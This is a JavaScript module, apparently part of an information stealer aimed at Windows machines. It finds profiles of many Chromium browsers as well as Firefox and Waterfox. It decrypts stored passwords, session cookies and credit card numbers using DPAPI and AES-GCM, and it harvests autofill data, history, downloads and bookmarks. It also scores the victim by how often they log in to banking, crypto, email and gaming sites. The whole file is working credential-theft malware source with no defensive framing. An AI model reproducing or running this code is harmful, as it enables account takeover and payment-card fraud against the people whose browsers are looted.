const fs = require("fs");
const sqlite3 = require("sqlite3");
const dpapi = require("win-dpapi");
const crypto = require("crypto");
const iconv = require('iconv-lite');
const save = require("./save");
const { stat } = require("./stats");
const gecko = require("./gecko");
const path = require("path");
const files = require("./files");

website = []

class Cookies {
    constructor(host, path, secure, expires, name, value) {
        this.host = host;
        this.path = path;
        this.secure = secure;
        this.expires = expires;
        this.name = name;
        this.value = value;
    }

    build() {
        return `${this.host}\tTRUE\t${this.path}\t${this.secure}\t${this.expires}\t${this.name}\t${this.value}\n`;
    }
}

class Password {
    constructor(site, username, password, timestamp, browser) {
        this.site = site;
        this.username = username;
        this.password = password;
        this.timestamp = timestamp;
        this.browser = browser;
    }

    build() {
        return `Site: ${this.site}\nUsername: ${this.username}\nPassword: ${this.password}\nBrowser: ${this.browser} | ${this.timestamp}\n`;
    }
}

class Autofill {
    constructor(input, value, browser) {
        this.input = input;
        this.value = value;
        this.browser = browser;
    }

    build() {
        return `Input: ${this.input}\nValue: ${this.value}\nBrowser: ${this.browser}\n`;
    }
}

class CreditCard {
    constructor(guid, name, expiration_mouth, expiration_year, number, address, nickname) {
        this.guid = guid;
        this.name = name;
        this.address = address;
        this.nickname = nickname;
        this.expiration = expiration_mouth + "/" + expiration_year;
        this.number = number;
    }

    build() {
        return `Guid: ${this.guid}\nName: ${this.name}\nAdress: ${this.address}\nNickname: ${this.nickname}\nExpiration: ${this.expiration
            }\nNumber: ${this.number}\n`
    }
}

class Visit {
    constructor(url, title, count, timestamp) {
        this.url = url;
        this.title = title;
        this.count = count;
        this.timestamp = timestamp;
    }

    build() {
        return `Url: ${this.url}\nTitle: ${this.title}\nCount: ${this.count}\nTimestamp: ${this.timestamp}\n`;
    }
}

class Download {
    constructor(path, url, total_bytes) {
        this.path = path;
        this.url = url;
        this.total_bytes = total_bytes;
    }

    build() {
        return `Url: ${this.url}\nPath: ${this.path}\nTotalBytes: ${this.total_bytes}\n`;
    }
}

class Bookmark {
    constructor(name, url, timestamp, browser) {
        this.url = url;
        this.name = name;
        this.timestamp = timestamp;
        this.browser = browser;
    }

    build() {
        return `Url: ${this.url}\nName: ${this.name}\nBrowser: ${this.browser}\nTimestamp: ${this.timestamp}\n`
    }
}

function getProfiles(path, name) {
    let profiles = [];

    if (fs.existsSync(path)) {
        let dirs = fs.readdirSync(path);
        for (let dir of dirs) {
            if (dir.includes("Profile") || dir == "Default") {
                profiles.push({
                    path: `${path}${dir}\\`,
                    name: name,
                    profile: dir
                });
            }
        }
        return profiles;
    } else {
        return [];
    }
}

function getGeckoProfiles(path, name) {
    let profiles = [];

    if (fs.existsSync(path)) {
        let dirs = fs.readdirSync(path);
        for (let dir of dirs) {
            if (dir.includes(".default-release") || dir.includes(".default-default-")) {
                profiles.push({
                    path: `${path}${dir}\\`,
                    name: name
                });
            }
        }
        return profiles;
    } else {
        return [];
    }
}

function getMasterKey(path) {
    if (fs.existsSync(`${path}Local State`)) {
        let localstate = JSON.parse(fs.readFileSync(`${path}Local State`, "utf8"));
        let master_key = localstate.os_crypt.encrypted_key;
        master_key = dpapi.unprotectData(Buffer.from(Buffer.from(master_key, "base64").slice(5), 'utf-8'), null, 'CurrentUser');
        return master_key;
    } else if (fs.existsSync(`${path}..\\Local State`)) {
        let localstate = JSON.parse(fs.readFileSync(`${path}..\\Local State`, "utf8"));
        let master_key = localstate.os_crypt.encrypted_key;
        master_key = dpapi.unprotectData(Buffer.from(Buffer.from(master_key, "base64").slice(5), 'utf-8'), null, 'CurrentUser');
        return master_key;
    } else {
        return "";
    }
}

async function tempSqlite(path, query) {
    let path_tmp = path + "_tmp";
    fs.copyFileSync(path, path_tmp);
    let db = new sqlite3.Database(path_tmp);
    let result = await new Promise((resolve, reject) => {
        db.all(query, (err, rows) => {
            if (err) {
                reject(err);
            } else {
                resolve(rows);
            }
        });
    });
    db.close();
    try {
        fs.unlinkSync(path_tmp);
    } catch (e) { }
    return result;
}

function decryptChrome(value, key) {
    let start = value.slice(3, 15),
        middle = value.slice(15, value.length - 16),
        end = value.slice(value.length - 16, value.length),
        decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
    decipher.setAuthTag(end);
    return decrypted = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
}

async function getCookies(basepath) {
    let cookies = [];
    let key = getMasterKey(basepath);

    if (fs.existsSync(`${basepath}Network\\Cookies`)) {

        var rows = [];
        try {
            rows = await tempSqlite(`${basepath}Network\\Cookies`, "SELECT name, host_key, path, expires_utc, is_secure, encrypted_value FROM cookies");
        } catch (e) { }

        for (let row of rows) {
            let value = row.encrypted_value;

            if (value.toString().startsWith("v10") || value.toString().startsWith("v11")) {
                if (key == "") {
                    continue;
                }

                try {
                    value = decryptChrome(value, key);
                } catch (e) {
                    continue;
                }
            } else {
                try {
                    value = dpapi.unprotectData(value, null, 'CurrentUser');
                } catch (e) {
                    continue;
                }
            }

            cookies.push(new Cookies(row.host_key, row.path, row.is_secure, row.expires_utc, row.name, value));
        }
    }

    return cookies;
}

async function getPasswords(basepath, browser) {
    var passwords = [];
    let key = getMasterKey(basepath);

    var loginPath = "";
    if (basepath.includes("Yandex")) {
        loginPath = `${basepath}Ya Passman Data`;
    } else {
        loginPath = `${basepath}Login Data`;
    }

    if (fs.existsSync(loginPath)) {
        let rows = [];
        try {
            rows = await tempSqlite(loginPath, "SELECT origin_url, username_value, password_value, date_created FROM logins");
        } catch (e) { }

        for (let row of rows) {
            let password = row.password_value;

            if (password.toString().startsWith("v10") || password.toString().startsWith("v11")) {
                if (key == "") {
                    continue;
                }

                try {
                    password = decryptChrome(password, key);
                } catch (e) {
                    continue;
                }
            } else {
                try {
                    password = dpapi.unprotectData(password, null, 'CurrentUser');
                } catch (e) {
                    continue;
                }
            }

            if (row.username_value != "" && password != "") {
                passwords.push(new Password(row.origin_url, row.username_value, password, row.date_created, browser));
                website.push(row.origin_url)
            }
        }
    }

    return passwords;
}

async function getAutofills(basepath, browser) {
    var autofills = [];

    if (fs.existsSync(`${basepath}Web Data`)) {
        let rows = [];
        try {
            rows = await tempSqlite(`${basepath}Web Data`, "SELECT name, value FROM autofill");
        } catch (e) { }

        for (let row of rows) {
            autofills.push(new Autofill(row.name, row.value, browser));
        }
    }

    return autofills;
}

async function getDownloads(basepath) {
    var downloads = [];

    if (fs.existsSync(`${basepath}History`)) {
        let rows = [];
        try {
            rows = await tempSqlite(`${basepath}History`, "SELECT target_path, tab_url, total_bytes FROM downloads");
        } catch (e) { }

        for (let row of rows) {
            downloads.push(new Download(row.target_path, row.tab_url, row.total_bytes));
        }
    }

    return downloads;
}

async function getCreditCards(basepath) {
    let creditcards = [];
    let key = getMasterKey(basepath);

    if (fs.existsSync(`${basepath}Web Data`)) {
        let rows = [];
        try {
            rows = await tempSqlite(`${basepath}Web Data`, "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards");
        } catch (e) { }

        for (let row of rows) {
            let number = row.card_number_encrypted;

            if (number.toString().startsWith("v10") || number.toString().startsWith("v11")) {
                if (key == "") {
                    continue;
                }

                try {
                    number = decryptChrome(number, key);
                } catch (e) {
                    continue;
                }
            } else {
                try {
                    number = dpapi.unprotectData(number, null, 'CurrentUser');
                } catch (e) {
                    continue;
                }
            }

            creditcards.push(new CreditCard(row.guid, row.name_on_card, row.expiration_month, row.expiration_year, number, row.billing_address_id, row.nickname))
        }
    }

    return creditcards;
}

async function getHistory(basepath) {
    var history = [];

    if (fs.existsSync(`${basepath}History`)) {
        let rows = [];
        try {
            rows = await tempSqlite(`${basepath}History`, "SELECT url, title, visit_count, last_visit_time FROM urls");
        } catch (e) { }

        for (let row of rows) {
            history.push(new Visit(row.url, row.title, row.visit_count, row.last_visit_time));
        }
    }

    return history;
}

async function getBookmarks(basepath, browser) {
    let bookmarks = [];

    if (fs.existsSync(`${basepath}Bookmarks`)) {
        fs.copyFileSync(`${basepath}Bookmarks`, `${basepath}Bookmarks_tmp`);
        let json = JSON.parse(fs.readFileSync(`${basepath}Bookmarks_tmp`));
        fs.unlinkSync(`${basepath}Bookmarks_tmp`);

        for (let bookmark of json.roots.bookmark_bar.children) {
            bookmarks.push(new Bookmark(bookmark.name, bookmark.url, bookmark.date_added, browser));
        }
    }

    return bookmarks;
}

async function getGeckoCookies(basepath) {
    var cookies = [];

    if (fs.existsSync(`${basepath}cookies.sqlite`)) {
        let rows = [];
        try {
            rows = await tempSqlite(`${basepath}cookies.sqlite`, "SELECT name, value, host, path, expiry, isSecure FROM moz_cookies");
        } catch (e) { }

        for (let row of rows) {
            cookies.push(new Cookies(row.host, row.path, row.isSecure, row.expiry, row.name, row.value));
        }
    }

    return cookies;
}

async function getGeckoPasswords(profile, masterPassword, browser) {
    const passwords = [];
    const key = await gecko.getKey(profile, masterPassword);
    if (key == null) {
        return passwords;
    }

    const loginsPath = path.join(profile, 'logins.json');
    if (!fs.existsSync(loginsPath)) {
        return passwords
    }

    const loginsData = fs.readFileSync(loginsPath, 'utf8');
    const profileLogins = JSON.parse(loginsData);
    for (const login of profileLogins.logins) {
        const decodedUsername = gecko.decodeLoginData(login.encryptedUsername);
        const decodedPassword = gecko.decodeLoginData(login.encryptedPassword);
        const username = gecko.decrypt(decodedUsername.data, decodedUsername.iv, key, '3DES-CBC');
        const password = gecko.decrypt(decodedPassword.data, decodedPassword.iv, key, '3DES-CBC');

        let encodeUsername = iconv.encode(username.data, 'latin1').toString();
        if (encodeUsername != username.data) {
            username.data = encodeUsername;
        }

        let encodePassword = iconv.encode(password.data, 'latin1').toString();
        if (encodePassword != password.data) {
            password.data = encodePassword;
        }

        passwords.push(new Password(login.hostname, username.data, password.data, login.timeLastUsed, browser));
    }

    return passwords;
}

async function getGeckoBookmarks(basepath, browser) {
    let bookmarks = [];

    if (fs.existsSync(`${basepath}places.sqlite`)) {
        let rows = [];
        try {
            rows = await tempSqlite(`${basepath}places.sqlite`, "SELECT id, url, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)");
        } catch (e) { }

        for (let row of rows) {
            bookmarks.push(new Bookmark(row.title, row.url, row.dateAdded, browser));
        }
    }

    return bookmarks;
}

async function getGeckoHistory(basepath) {
    let history = [];

    if (fs.existsSync(`${basepath}places.sqlite`)) {
        let rows = [];
        try {
            rows = await tempSqlite(`${basepath}places.sqlite`, "SELECT title, url, visit_count, last_visit_date FROM moz_places where title not null");
        } catch (e) { }

        for (let row of rows) {
            history.push(new Visit(row.url, row.title, row.visit_count, row.last_visit_date));
        }
    }

    return history;
}

async function getGeckoDownloads(basepath) {
    let downloads = [];

    if (fs.existsSync(`${basepath}places.sqlite`)) {
        let rows = [];
        try {
            rows = await tempSqlite(`${basepath}places.sqlite`, "SELECT GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id");
        } catch (e) { }

        for (let row of rows) {

            try {
                downloads.push(new Download(row["GROUP_CONCAT(content)"].split("},")[1], row.url, JSON.parse(row["GROUP_CONCAT(content)"].split("},")[0] + "}").fileSize));
            } catch (e) {
                continue;
            }
        }
    }

    return downloads;
}

async function grabBrowsers() {
    let appdata = process.env.APPDATA;
    let localappdata = process.env.LOCALAPPDATA;

    var chromiumPath = [
        {
            path: appdata + "\\Opera Software\\Opera Stable\\",
            name: "Opera"
        },
        {
            path: appdata + "\\Opera Software\\Opera GX Stable\\",
            name: "OperaGX"
        },
        {
            path: localappdata + "\\Epic Privacy Browser\\User Data\\",
            name: "EpicPrivacy",
        },
        {
            path: localappdata + "\\Google\\Chrome SxS\\User Data\\",
            name: "ChromeSxS",
        },
        {
            path: localappdata + "\\Sputnik\\Sputnik\\User Data\\",
            name: "Sputnik",
        },
        {
            path: localappdata + "\\7Star\\7Star\\User Data\\",
            name: "7Star",
        },
        {
            path: localappdata + "\\CentBrowser\\User Data\\",
            name: "CentBrowser",
        },
        {
            path: localappdata + "\\Orbitum\\User Data\\",
            name: "Orbitum",
        },
        {
            path: localappdata + "\\Kometa\\User Data\\",
            name: "Kometa",
        },
        {
            path: localappdata + "\\Torch\\User Data\\",
            name: "Torch",
        },
        {
            path: localappdata + "\\Amigo\\User Data\\",
            name: "Amigo",
        }
    ]

    chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\", "Brave"))
    chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Iridium\\User Data\\", "Iridium"))
    chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Yandex\\YandexBrowser\\User Data\\", "Yandex"))
    chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\uCozMedia\\Uran\\User Data\\", "Uran"))
    chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Microsoft\\Edge\\User Data\\", "Edge"))
    chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Google\\Chrome\\User Data\\", "Chrome"))
    chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Vivaldi\\User Data\\", "Vivaldi"))

    var cookieslength = 0;
    var passwords = [];
    var autofills = [];
    var cards = [];
    var bookmarks = [];
    var history = [];
    var downloads = [];
    let i = 0;

    for (let obj of chromiumPath) {
        const path = obj.path;
        if (!fs.existsSync(path)) {
            continue;
        }

        i++;

        try {
            const cookies = await getCookies(path);
            cookieslength += cookies.length;

            let browserName;
            if (typeof obj.profile != "undefined") {
                browserName = obj.name + " [ " + obj.profile + " ]";
            } else {
                browserName = obj.name;
            }

            save.saveCookies(cookies, browserName);
            files.grabRoblox(cookies, browserName, i);

            passwords = passwords.concat(await getPasswords(path, browserName));
            autofills = autofills.concat(await getAutofills(path, browserName));
            cards = cards.concat(await getCreditCards(path));
            history = history.concat(await getHistory(path));
            downloads = downloads.concat(await getDownloads(path));
            bookmarks = bookmarks.concat(await getBookmarks(path, browserName));
        } catch (e) {
            continue;
        }
    }

    let geckoPath = [];

    geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Mozilla\\Firefox\\Profiles\\", "Firefox"));
    geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Waterfox\\Profiles\\", "Waterfox"));

    for (let obj of geckoPath) {
        const path = obj.path;
        if (!fs.existsSync(path)) {
            continue;
        }

        i++;

        try {
            const cookies = await getGeckoCookies(path);
            cookieslength += cookies.length;
            save.saveCookies(cookies, obj.name);
            files.grabRoblox(cookies, obj.name, i);

            bookmarks = bookmarks.concat(await getGeckoBookmarks(path, obj.name));
            history = history.concat(await getGeckoHistory(path));
            downloads = downloads.concat(await getGeckoDownloads(path));
            passwords = passwords.concat(await getGeckoPasswords(path, "", obj.name));
        } catch (e) {
            continue;
        }
    }
    const importantSites = [
        "gmail",
        "youtube",
        "onoff",
        "xss.is",
        "pronote",
        "ovhcloud",
        "nulled",
        "cracked",
        "tiktok",
        "yahoo",
        "gmx",
        "aol",
        "coinbase",
        "binance",
        "steam",
        "epicgames",
        "discord",
        "paypal",
        "instagram",
        "spotify",
        "onlyfans",
        "pornhub",
        "origin",
        "amazon",
        "twitter",
        "aliexpress",
        "netflix",
        "roblox",
        "twitch",
        "facebook",
        "riotgames",
        "card",
        "telegram",
        "protonmail"
    ];
      
    function countImportantSites(website, importantSites) {
        let count = {};
        importantSites.forEach(importantSite => {
          count[importantSite] = 0;
        });
        website.forEach(visitedSite => {
          importantSites.forEach(importantSite => {
            if (visitedSite.includes(importantSite)) {
              count[importantSite]++;
            }
          });
        });
        return count;
      }
      
      const count = countImportantSites(website, importantSites);
      
      for (const site in count) {
        if (count[site] > 0) {
          stat.AddKeyword(` ${site} : ${count[site]}`);
        }
      }
    save.saveBrowser(passwords, autofills, cards, history, downloads, bookmarks)
    stat.AddBrowser(passwords.length, cookieslength, autofills.length, cards.length, history.length, downloads.length, bookmarks.length)

    var pass = [];
    for (let i = 0; i < passwords.length; i++) {
        pass.push(passwords[i].password)
    }
    return pass
}

module.exports = {
    grabBrowsers,
    getGeckoPasswords,
    getGeckoProfiles
}